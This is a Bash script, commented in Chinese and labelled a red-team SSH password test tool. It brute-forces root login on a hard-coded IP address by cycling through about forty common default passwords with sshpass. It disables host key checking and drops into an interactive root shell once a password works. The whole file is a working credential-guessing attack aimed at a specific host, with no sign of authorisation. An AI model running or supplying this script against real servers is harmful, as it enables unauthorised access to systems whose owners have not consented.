#!/bin/bash
# SSH密码测试脚本

HOST="82.29.71.156"
USER="root"
PASSWORDS=(
    "admin123"
    "admin"
    "password"
    "123456"
    "root"
    "toor"
    "pass"
    "1234"
    "admin123456"
    "root123"
    "password123"
    "123456789"
    "qwerty"
    "abc123"
    "admin@123"
    "root@123"
    "12345"
    "111111"
    "000000"
    "ubuntu"
    "centos"
    "debian"
    "fedora"
    "kali"
    "parrot"
    "arch"
    "gentoo"
    "alpine"
    "test"
    "test123"
    "user"
    "user123"
    "guest"
    "guest123"
    "demo"
    "demo123"
    "temp"
    "temp123"
    "default"
    "default123"
)

echo "🔐 SSH密码测试工具 - 红队安全专家专用"
echo "目标: $USER@$HOST"
echo "测试密码数量: ${#PASSWORDS[@]}"
echo "=" * 50

for i in "${!PASSWORDS[@]}"; do
    password="${PASSWORDS[$i]}"
    echo -n "测试密码 $((i+1))/${#PASSWORDS[@]}: $password ... "
    
    if sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o PreferredAuthentications=password "$USER@$HOST" "echo 'SUCCESS'" 2>/dev/null; then
        echo "✅ 成功!"
        echo "🎯 找到正确密码: $password"
        echo "🚀 建立连接..."
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$USER@$HOST"
        exit 0
    else
        echo "❌ 失败"
    fi
done

echo "❌ 所有密码测试失败"